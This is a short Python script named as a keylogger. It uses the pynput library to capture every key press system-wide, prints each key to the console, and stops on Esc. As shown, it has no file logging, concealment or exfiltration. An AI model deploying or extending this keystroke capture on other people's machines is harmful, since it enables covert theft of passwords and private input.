import pynput
from pynput.keyboard import Key, Listener
def keylogger():
    def on_press(key):
        print("{}".format(key),end="")
    def on_release(key):
        if key==Key.esc:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
keylogger()